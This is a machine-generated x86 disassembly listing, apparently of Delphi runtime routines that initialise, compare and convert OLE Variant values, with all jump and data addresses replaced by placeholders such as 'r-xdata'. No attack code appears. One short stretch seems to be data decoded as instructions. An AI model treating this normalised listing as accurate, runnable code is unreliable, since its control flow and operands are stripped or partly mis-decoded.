mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_4128f8
jmp r-xdata
sub_412e58
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412ec2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f1e0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
cmp [ ebp - 0x10 ] 0xd
je r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_4057a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412ec9
lea eax [ ebp - 0x10 ]
call sub_40eeb8
retn
mov dx 0xd
mov ax 0x101
call sub_40e680
sub_412ed0
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
cmp eax 0xd
jg r-xdata
sub eax 0x101
je r-xdata
je r-xdata
mov edx ebx
mov eax esi
call sub_412e58
jmp r-xdata
sub eax 0x3f08
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4057a4
jmp r-xdata
sub eax 0x1
jb r-xdata
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4057a4
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax esi
call sub_40578c
jmp r-xdata
je r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub eax 0x8
je r-xdata
mov edx esp
mov ax [ ebx ]
call sub_4143cc
test al al
je r-xdata
mov eax esi
call sub_40578c
jmp r-xdata
mov dx 0xd
mov ax 0x1
call sub_40e680
jmp r-xdata
mov ax [ ebx ]
mov dx 0xd
call sub_40e680
mov eax esi
call sub_40578c
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_403244
test al al
jne r-xdata
sub_412f9c
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov ax [ ebx ]
sub ax 0x1
jb r-xdata
mov eax esi
call sub_40578c
jmp r-xdata
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0x8
je r-xdata
mov eax esi
call sub_40578c
jmp r-xdata
mov dx 0x9
mov ax 0x1
call sub_40e680
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4057a4
jmp r-xdata
sub ax 0x4000
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4057a4
jmp r-xdata
jmp r-xdata
mov edx esp
mov ax [ ebx ]
call sub_4143cc
test al al
je r-xdata
mov ax [ ebx ]
mov dx 0x9
call sub_40e680
mov eax esi
call sub_40578c
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_403244
test al al
jne r-xdata
sub_413048
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40ee3c
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_413084
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x3
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40ee3c
sub_4130a4
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x11
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40ee3c
sub_4130c4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x12
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40ee3c
sub_4130e4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x13
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40ee3c
sub_413104
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x10
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40ee3c
sub_413124
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x2
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40ee3c
sub_413144
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ee3c
sub_413170
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x4
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_40ee3c
sub_413194
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x5
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ee3c
sub_4131c0
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x6
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ee3c
sub_4131ec
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x7
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ee3c
sub_413218
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40ee3c
sub_41327c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403f74
pop esi
pop ebx
retn
mov eax ebx
call sub_40ee3c
sub_4132a8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_4047fc
pop esi
pop ebx
retn
mov eax ebx
call sub_40ee3c
sub_4132e0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0xd
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4057a4
pop esi
pop ebx
retn
mov eax ebx
call sub_40ee3c
sub_41330c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x9
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4057a4
pop esi
pop ebx
retn
mov eax ebx
call sub_40ee3c
sub_413338
push ebx
mov ebx eax
and bx 0xfff
cmp bx 0x14
jbe r-xdata
mov eax ebx
pop ebx
retn
cmp bx 0x100
jne r-xdata
call sub_40e71c
mov bx 0x8
jmp r-xdata
sub_41335c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41341f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x11 ]
call sub_40f1e0
cmp [ esi ] 0x101
jne r-xdata
cmp [ ebx ] 0x101
jne r-xdata
lea eax [ ebp - 0x11 ]
call [ rw-data ]
mov edx ebx
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_413c10
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413426
lea eax [ ebp - 0x11 ]
call sub_40eeb8
retn
lea eax [ ebp - 0x21 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4133f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x21 ]
call sub_40f1e0
lea eax [ ebp - 0x21 ]
call [ rw-data ]
lea edx [ ebp - 0x21 ]
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_413c10
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x21 ]
call sub_40eeb8
retn
sub_413444
push ebx
push ecx
mov [ esp ] dl
mov bl 0x1
mov edx ecx
sub edx 0xe
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
je r-xdata
call sub_40e770
jmp r-xdata
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
sub edx 0x4
jb r-xdata
mov eax ebx
pop edx
pop ebx
retn
mov bl [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_40e770
jmp r-xdata
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
jmp r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov bl [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_40e770
jmp r-xdata
je r-xdata
call sub_40e71c
xor eax eax
jmp r-xdata
cmp [ esp ] 0x2
je r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov bl [ ecx * 2 + rw-data ]
jmp r-xdata
dec dl
je r-xdata
and eax 0x7f
mov bl [ eax + rw-data ]
jmp r-xdata
mov al 0x1
mov al 0x1
cmp [ esp ] 0x2
jne r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl 0x2
jmp r-xdata
cmp [ esp ] 0x2
jne r-xdata
and eax 0x7f
mov bl [ eax + rw-data ]
jmp r-xdata
xor ebx ebx
jmp r-xdata
mov bl 0x1
jmp r-xdata
sub_413540
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
jle r-xdata
cmp eax [ ebp + 0x8 ]
jbe r-xdata
pop ebp
retn 0x10
mov al 0x1
mov al 0x2
jmp r-xdata
jmp r-xdata
sub_41357c
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_4135a4
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_4135cc
push ebp
mov ebp esp
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fnstsw ax
sahf
jbe r-xdata
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fnstsw ax
sahf
jae r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_4135f8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx edx
xor edx edx
push ebp
push sub_413653
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_4121d0
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_4121d0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407d7c
xor edx edx
call sub_41352c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41365a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f44
retn
sub_413664
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov ax [ esi ]
call sub_413338
movzx eax ax
mov bl [ eax + rw-data ]
mov ax [ edi ]
call sub_413338
movzx eax ax
mov al [ eax + rw-data ]
xor edx edx
mov dl al
xor ecx ecx
mov cl bl
imul ecx ecx 0xb
add ecx rw-data
movzx edx [ ecx + edx ]
cmp edx 0xa
ja r-xdata
call sub_40e71c
mov al 0x1
jmp [ edx * 4 + jump_table_4136b5 ]
call sub_40e71c
mov al 0x1
jmp r-xdata
mov edx eax
mov eax ebx
call sub_413430
jmp r-xdata
mov ecx ebp
mov edx eax
mov eax ebx
call sub_413444
jmp r-xdata
mov eax edi
call sub_40f870
push eax
mov eax esi
call sub_40f870
pop edx
call sub_41352c
jmp r-xdata
mov eax esi
call sub_410334
push edx
push eax
mov eax edi
call sub_410334
push edx
push eax
call sub_413540
jmp r-xdata
mov eax esi
call sub_410e44
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_410e44
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_41357c
jmp r-xdata
mov eax esi
call sub_4115b4
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_4115b4
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_4135a4
jmp r-xdata
mov eax esi
call sub_411b1c
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax edi
call sub_411b1c
add esp 0xfffffff8
fistp [ esp ]
fwait
call sub_4135cc
jmp r-xdata
mov edx edi
mov eax esi
call sub_4135f8
jmp r-xdata
mov eax edi
call sub_410930
and eax 0x7f
push eax
mov eax esi
call sub_410930
and eax 0x7f
pop edx
call sub_41352c
jmp r-xdata
mov edx edi
mov eax esi
mov ecx ebp
call sub_41335c
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4137f0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x9 ] 0x1
mov si [ ebx ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
test ax ax
jne r-xdata
test si si
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp ax 0x1
jne r-xdata
mov dl 0x1
xor eax eax
call sub_413430
mov [ ebp - 0x9 ] al
jmp r-xdata
cmp si 0x1
jne r-xdata
xor edx edx
mov al 0x1
call sub_413430
mov [ ebp - 0x9 ] al
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax esi
call sub_4143cc
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x2
xor eax eax
call sub_413444
mov [ ebp - 0x9 ] al
jmp r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
call sub_4143cc
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
xor edx edx
mov al 0x2
call sub_413444
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
mov edx [ ebp - 0x4 ]
mov ecx 0xb
mov eax [ ebp - 0x14 ]
mov esi [ eax ]
call [ esi + 0x8 ]
test al al
je r-xdata
call sub_40e71c
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40e71c
jmp r-xdata
mov esi [ ebp - 0x4 ]
mov si [ esi ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413989
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebx ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40f4ac
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebx ]
je r-xdata
mov ax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax esi
call sub_4143cc
test al al
jne r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413b1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f4ac
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
cmp ax [ ebp - 0x28 ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413a79
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xe ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40f4ac
mov ax [ ebp - 0x28 ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax ebx
mov ecx [ ebp - 0x8 ]
call sub_413664
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40eeb8
retn
call sub_40e62c
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4138fb
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f4ac
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebp - 0xc ]
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40e71c
jmp r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x8 ]
call sub_413664
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40eeb8
retn
call sub_40e62c
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40eeb8
retn
call sub_40e62c
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40eeb8
retn
call sub_40e62c
call sub_40e71c
mov ax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413bd1
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f4ac
mov ax [ ebp - 0x28 ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40eeb8
retn
call sub_40e62c
sub_413c10
push esi
push edi
mov si [ eax ]
mov di [ edx ]
cmp si 0x10f
jae r-xdata
cmp si 0x400c
jne r-xdata
cmp di 0x10f
jae r-xdata
cmp di 0x400c
jne r-xdata
mov eax [ eax + 0x8 ]
call sub_413c10
jmp r-xdata
call sub_413664
pop edi
pop esi
retn
and si 0xfff
cmp si 0x10f
jae r-xdata
mov edx [ edx + 0x8 ]
call sub_413c10
jmp r-xdata
pop edi
pop esi
retn
call sub_4137f0
and di 0xfff
cmp di 0x10f
jae r-xdata
call sub_413664
jmp r-xdata
sub_413dfc
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_413f22
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_403f74
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_403f74
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4143cc
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_403f74
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_40422c
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_408168
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_40422c
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4030e0
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_402874
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_404184
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413f29
lea eax [ ebp - 0x208 ]
call sub_403f20
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_40422c
sub_413f80
push ebx
push esi
push edi
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_413f70
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov bx [ esp + 0x4 ]
cmp bx 0x10f
jae r-xdata
mov edx esp
mov eax ebx
call sub_4143cc
test al al
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor eax eax
lea edx [ esp + 0x4 ]
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
jmp r-xdata
mov al 0x1
jmp r-xdata
mov ax [ esp + 0x4 ]
cmp ax 0x9
je r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0xc ] 0x0
je r-xdata
cmp ax 0xd
jne r-xdata
xor eax eax
jmp r-xdata
sub_413ff4
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov eax ebx
call sub_413f70
push esi
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax esi
call sub_413f70
push esi
mov esi eax
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov ax [ esp ]
test ax ax
jne r-xdata
cmp ax 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
sete al
jmp r-xdata
mov ax [ esp + 0x10 ]
sub ax 0x2
jae r-xdata
cmp [ esp + 0x10 ] 0x1
sete al
jmp r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx esi
call sub_414574
sete al
xor eax eax
jmp r-xdata
sub_414090
push ebx
mov bx [ eax ]
cmp bx 0x400c
jne r-xdata
mov [ edx ] bx
test [ edx + 0x1 ] 0x20
setne bl
test bl bl
je r-xdata
mov eax [ eax + 0x8 ]
call sub_414090
mov ebx eax
jmp r-xdata
xor eax eax
mov [ ecx ] eax
test [ edx + 0x1 ] 0x40
je r-xdata
mov eax ebx
pop ebx
retn
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
jmp r-xdata
sub_4140dc
add esp 0xfffffff8
test dl dl
je r-xdata
mov ax [ eax ]
and ax 0x2000
cmp ax 0x2000
sete al
pop ecx
pop edx
retn
lea ecx [ esp + 0x4 ]
mov edx esp
call sub_414090
pop ecx
pop edx
retn
sub_414119
fsub st0
inc eax
add [ eax ] cl
push esi
popad
jb r-xdata
idiv esi
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_4143cc
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_41434c
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_414128
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_414189
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_404f18
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414190
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_403190
sub_4141d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_41434c
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_4143cc
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_41422c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
